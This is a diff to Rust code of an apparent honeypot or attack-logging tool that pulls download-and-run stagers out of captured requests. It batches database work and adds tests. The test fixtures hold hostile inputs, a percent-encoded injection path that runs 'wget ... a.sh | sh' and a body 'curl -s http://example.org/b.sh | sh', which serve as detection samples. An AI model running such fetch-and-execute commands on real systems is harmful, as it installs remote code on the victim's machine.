@@ -116,13 +116,15 @@ impl Found {
 }
 
 /// Rows with something to read: a body, a query, or a path that holds a
-/// command separator, `$`, a backtick or a blank. The other rows only get
+/// command separator, `$`, a backtick or a blank, or is percent-encoded
+/// (the parser decodes it, so `%3B` is a `;`). The other rows only get
 /// their `xray_v` stamped.
 const HEAVY: &str = "(body IS NOT NULL AND length(body) > 0)
      OR (query IS NOT NULL AND query <> '')
      OR instr(path, ';') > 0 OR instr(path, '|') > 0 OR instr(path, '&') > 0
      OR instr(path, '$') > 0 OR instr(path, char(96)) > 0
-     OR instr(path, ' ') > 0 OR instr(path, char(9)) > 0";
+     OR instr(path, ' ') > 0 OR instr(path, char(9)) > 0
+     OR instr(path, '%') > 0 OR instr(path, '+') > 0";
 
 #[derive(sqlx::FromRow)]
 struct ReqRow {
@@ -295,7 +297,8 @@ async fn backfill_at(pool: &SqlitePool, v: i64) -> Result<u64> {
 
 /// A new X-ray version reads every row again: clear what the old one
 /// derived and mark every row unread. Pieces stay (an operator's results
-/// hang on them) until [`refresh_counts`] finds them without sightings.
+/// hang on them) until [`refresh_counts`] finds them without sightings,
+/// and keep their old counts until then.
 async fn reset_if_changed(pool: &SqlitePool, v: i64) -> Result<()> {
     let stored: Option<String> = sqlx::query_scalar("SELECT value FROM settings WHERE key = ?")
         .bind(VERSION_KEY)
@@ -349,24 +352,28 @@ async fn reset_if_changed(pool: &SqlitePool, v: i64) -> Result<()> {
     Ok(())
 }
 
-/// Stamp the requests with nothing to read, without reading them.
+/// Stamp the requests with nothing to read, without reading them. Walks
+/// id ranges, so each row is looked at once.
 async fn stamp_light(pool: &SqlitePool, v: i64) -> Result<()> {
     let sql = format!(
-        "UPDATE requests SET xray_v = ?1 WHERE id IN
-           (SELECT id FROM requests WHERE xray_v = 0 AND NOT ({HEAVY}) ORDER BY id LIMIT ?2)"
+        "UPDATE requests SET xray_v = ?1
+         WHERE id > ?2 AND id <= ?3 AND xray_v = 0 AND NOT ({HEAVY})"
     );
-    loop {
-        let n = sqlx::query(sqlx::AssertSqlSafe(sql.as_str()))
+    let max: Option<i64> = sqlx::query_scalar("SELECT MAX(id) FROM requests")
+        .fetch_one(pool)
+        .await?;
+    let mut lo = 0;
+    while lo < max.unwrap_or(0) {
+        sqlx::query(sqlx::AssertSqlSafe(sql.as_str()))
             .bind(v)
-            .bind(STAMP_CHUNK)
+            .bind(lo)
+            .bind(lo + STAMP_CHUNK)
             .execute(pool)
-            .await?
-            .rows_affected();
-        if n == 0 {
-            return Ok(());
-        }
+            .await?;
+        lo += STAMP_CHUNK;
         tokio::time::sleep(PAUSE / 10).await;
     }
+    Ok(())
 }
 
 async fn walk_requests(pool: &SqlitePool, v: i64) -> Result<u64> {
@@ -391,16 +398,28 @@ async fn walk_requests(pool: &SqlitePool, v: i64) -> Result<u64> {
             (rows, found)
         })
         .await?;
-        let mut tx = pool.begin_with("BEGIN IMMEDIATE").await?;
-        for (r, f) in rows.iter().zip(&found) {
-            if stamp(&mut tx, Table::Requests, r.id, v).await? {
-                write(&mut tx, "request", r.id, r.ip_id, &r.ts, f).await?;
-            }
-        }
-        tx.commit().await?;
+        write_requests(pool, &rows, &found, v).await?;
         done += rows.len() as u64;
         tokio::time::sleep(PAUSE).await;
     }
+}
+
+/// Store a batch read earlier, in one short transaction. A row deleted
+/// since it was read is not stamped, so nothing is stored for it.
+async fn write_requests(
+    pool: &SqlitePool,
+    rows: &[ReqRow],
+    found: &[Vec<Found>],
+    v: i64,
+) -> Result<()> {
+    let mut tx = pool.begin_with("BEGIN IMMEDIATE").await?;
+    for (r, f) in rows.iter().zip(found) {
+        if stamp(&mut tx, Table::Requests, r.id, v).await? {
+            write(&mut tx, "request", r.id, r.ip_id, &r.ts, f).await?;
+        }
+    }
+    tx.commit().await?;
+    Ok(())
 }
 
 async fn walk_uploads(pool: &SqlitePool, v: i64) -> Result<u64> {
@@ -465,52 +484,109 @@ async fn extract_upload(pool: &SqlitePool, r: &UpRow) -> Result<Vec<Found>> {
     Ok(out)
 }
 
-/// Recompute what the sightings imply: each piece's addresses, sources
-/// and first and last time; each URL's sources and times. Delete pieces
-/// and URLs nothing sights any more (a deleted request, address or
-/// retention took the rows), except pieces an operator entered results for.
-pub async fn refresh_counts(conn: &mut SqliteConnection) -> Result<()> {
-    for sql in [
+/// The refresh statements for the pieces whose key is in `?1..=?2`.
+fn refresh_sql() -> [String; 5] {
+    [
         // A URL only a deleted source named.
-        "DELETE FROM piece_url_sources WHERE NOT EXISTS
+        "DELETE FROM piece_url_sources WHERE piece >= ?1 AND piece <= ?2 AND NOT EXISTS
            (SELECT 1 FROM piece_sightings g WHERE g.piece = piece_url_sources.piece
             AND g.source_kind = piece_url_sources.source_kind
-            AND g.source_id = piece_url_sources.source_id)",
-        "DELETE FROM piece_urls WHERE NOT EXISTS
+            AND g.source_id = piece_url_sources.source_id)"
+            .into(),
+        "DELETE FROM piece_urls WHERE piece >= ?1 AND piece <= ?2 AND NOT EXISTS
            (SELECT 1 FROM piece_url_sources s
-            WHERE s.piece = piece_urls.piece AND s.url = piece_urls.url)",
+            WHERE s.piece = piece_urls.piece AND s.url = piece_urls.url)"
+            .into(),
         "UPDATE piece_urls SET
            sources = a.n, first_seen = a.f, last_seen = a.l
          FROM (SELECT piece, url, COUNT(*) n, MIN(ts) f, MAX(ts) l
-               FROM piece_url_sources GROUP BY piece, url) a
+               FROM piece_url_sources WHERE piece >= ?1 AND piece <= ?2
+               GROUP BY piece, url) a
          WHERE piece_urls.piece = a.piece AND piece_urls.url = a.url
            AND (piece_urls.sources <> a.n OR piece_urls.first_seen <> a.f
-                OR piece_urls.last_seen <> a.l)",
+                OR piece_urls.last_seen <> a.l)"
+            .into(),
         "UPDATE pieces SET ips = a.ips, sources = a.sources,
            first_seen = a.f, last_seen = a.l
          FROM (SELECT piece, COUNT(DISTINCT ip_id) ips,
                       COUNT(DISTINCT source_kind || ':' || source_id) sources,
                       MIN(ts) f, MAX(ts) l
-               FROM piece_sightings GROUP BY piece) a
+               FROM piece_sightings WHERE piece >= ?1 AND piece <= ?2
+               GROUP BY piece) a
          WHERE pieces.hash = a.piece
            AND (pieces.ips <> a.ips OR pieces.sources <> a.sources
-                OR pieces.first_seen <> a.f OR pieces.last_seen <> a.l)",
-        "DELETE FROM pieces WHERE NOT EXISTS
+                OR pieces.first_seen <> a.f OR pieces.last_seen <> a.l)"
+            .into(),
+        "DELETE FROM pieces WHERE hash >= ?1 AND hash <= ?2
+           AND NOT EXISTS
              (SELECT 1 FROM piece_sightings g WHERE g.piece = pieces.hash)
-           AND NOT EXISTS (SELECT 1 FROM piece_results r WHERE r.piece = pieces.hash)",
-    ] {
-        sqlx::query(sql).execute(&mut *conn).await?;
+           AND NOT EXISTS (SELECT 1 FROM piece_results r WHERE r.piece = pieces.hash)"
+            .into(),
+    ]
+}
+
+async fn refresh_range(conn: &mut SqliteConnection, lo: i64, hi: i64) -> Result<()> {
+    for sql in refresh_sql() {
+        sqlx::query(sqlx::AssertSqlSafe(sql.as_str()))
+            .bind(lo)
+            .bind(hi)
+            .execute(&mut *conn)
+            .await?;
     }
     Ok(())
 }
 
-/// [`backfill`], then [`refresh_counts`] in one write transaction. The
-/// background callers use this.
+/// Recompute what the sightings imply: each piece's addresses, sources
+/// and first and last time; each URL's sources and times. Delete pieces
+/// and URLs nothing sights any more (the delete triggers already removed
+/// most; this catches the rest), except pieces an operator entered
+/// results for. One pass over everything: the background runs
+/// [`extract`], which does it in short transactions.
+pub async fn refresh_counts(conn: &mut SqliteConnection) -> Result<()> {
+    refresh_range(conn, i64::MIN, i64::MAX).await
+}
+
+/// Buckets of the piece-hash space [`extract`] refreshes one transaction
+/// at a time.
+const REFRESH_BUCKETS: i128 = 256;
+/// `settings` key: the sighting count at the last refresh.
+const REFRESHED_KEY: &str = "pieces_refreshed_n";
+/// One extraction at a time: a version reset must not overlap another.
+static EXTRACTING: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
+
+/// [`backfill`], then [`refresh_counts`] in short transactions, one per
+/// bucket of piece keys, unless nothing was read and the sighting count is
+/// what the last refresh saw. The background callers use this.
 pub async fn extract(pool: &SqlitePool) -> Result<u64> {
+    let _one = EXTRACTING.lock().await;
     let n = backfill(pool).await?;
-    let mut tx = pool.begin_with("BEGIN IMMEDIATE").await?;
-    refresh_counts(&mut tx).await?;
-    tx.commit().await?;
+    let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM piece_sightings")
+        .fetch_one(pool)
+        .await?;
+    let last: Option<String> = sqlx::query_scalar("SELECT value FROM settings WHERE key = ?")
+        .bind(REFRESHED_KEY)
+        .fetch_optional(pool)
+        .await?;
+    if n == 0 && last.as_deref() == Some(count.to_string().as_str()) {
+        return Ok(0);
+    }
+    let width = (1i128 << 64) / REFRESH_BUCKETS;
+    for b in 0..REFRESH_BUCKETS {
+        let lo = i64::MIN as i128 + b * width;
+        let hi = lo + width - 1;
+        let mut tx = pool.begin_with("BEGIN IMMEDIATE").await?;
+        refresh_range(&mut tx, lo as i64, hi as i64).await?;
+        tx.commit().await?;
+        tokio::time::sleep(PAUSE / 25).await;
+    }
+    sqlx::query(
+        "INSERT INTO settings (key, value) VALUES (?, ?)
+         ON CONFLICT (key) DO UPDATE SET value = excluded.value",
+    )
+    .bind(REFRESHED_KEY)
+    .bind(count.to_string())
+    .execute(pool)
+    .await?;
     Ok(n)
 }
 
@@ -933,14 +1009,81 @@ mod tests {
             query: None,
             body: Some(STAGER.to_vec()),
         };
-        assert!(!extract_request(&row).is_empty());
+        let found = vec![extract_request(&row)];
+        assert!(!found[0].is_empty());
         s.delete_request(a).await.unwrap();
-        let mut tx = s.pool.begin_with("BEGIN IMMEDIATE").await.unwrap();
-        assert!(!stamp(&mut tx, Table::Requests, a, XRAY_V).await.unwrap());
-        tx.commit().await.unwrap();
+        write_requests(&s.pool, &[row], &found, XRAY_V)
+            .await
+            .unwrap();
         run(&s).await;
         assert_eq!(count(&s, "piece_sightings").await, 0);
         refresh(&s).await;
         assert_eq!(count(&s, "pieces").await, 0);
+    }
+
+    #[tokio::test]
+    async fn encoded_separators_in_a_path_are_read() {
+        let (s, _d) = store().await;
+        let ip_id = s.upsert_ip(IP.parse().unwrap()).await.unwrap().id;
+        let id = s
+            .insert_request(&NewRequest {
+                ip_id,
+                method: "GET".into(),
+                path: "/x%3Bwget%20http://example.org/a.sh%7Csh".into(),
+                headers_json: "[]".into(),
+                labels_json: "[]".into(),
+                ..Default::default()
+            })
+            .await
+            .unwrap();
+        assert_eq!(backfill(&s.pool).await.unwrap(), 1);
+        assert_eq!(xray_v(&s, id).await, XRAY_V);
+    }
+
+    #[tokio::test]
+    async fn url_is_gone_at_once_after_the_address_is_deleted() {
+        let (s, _d) = store().await;
+        let (_, ip_id) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
+        let (_, other) = request(
+            &s,
+            "203.0.113.8",
+            Some(b"curl -s http://example.org/b.sh | sh"),
+            "2026-10-02 00:00:00",
+        )
+        .await;
+        run(&s).await;
+        let h = piece_hash("stager", "example.org");
+        s.delete_ip(ip_id).await.unwrap();
+        let urls = s.piece_urls(h).await.unwrap();
+        assert_eq!(urls.len(), 1, "no refresh_counts ran");
+        assert_eq!(urls[0].url, "http://example.org/b.sh");
+        s.delete_ip(other).await.unwrap();
+        assert!(s.piece_urls(h).await.unwrap().is_empty());
+        assert!(s.piece(h).await.unwrap().is_none());
+    }
+
+    #[tokio::test]
+    async fn extract_skips_the_refresh_when_nothing_changed() {
+        let (s, _d) = store().await;
+        request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
+        assert_eq!(extract(&s.pool).await.unwrap(), 1);
+        // Counts made stale by hand stay: a second pass does not refresh.
+        sqlx::query("UPDATE pieces SET ips = 99")
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        assert_eq!(extract(&s.pool).await.unwrap(), 0);
+        let n: i64 = sqlx::query_scalar("SELECT MAX(ips) FROM pieces")
+            .fetch_one(&s.pool)
+            .await
+            .unwrap();
+        assert_eq!(n, 99);
+        request(&s, "203.0.113.8", Some(STAGER), "2026-10-02 00:00:00").await;
+        extract(&s.pool).await.unwrap();
+        let n: i64 = sqlx::query_scalar("SELECT MAX(ips) FROM pieces")
+            .fetch_one(&s.pool)
+            .await
+            .unwrap();
+        assert_eq!(n, 2);
     }
 }
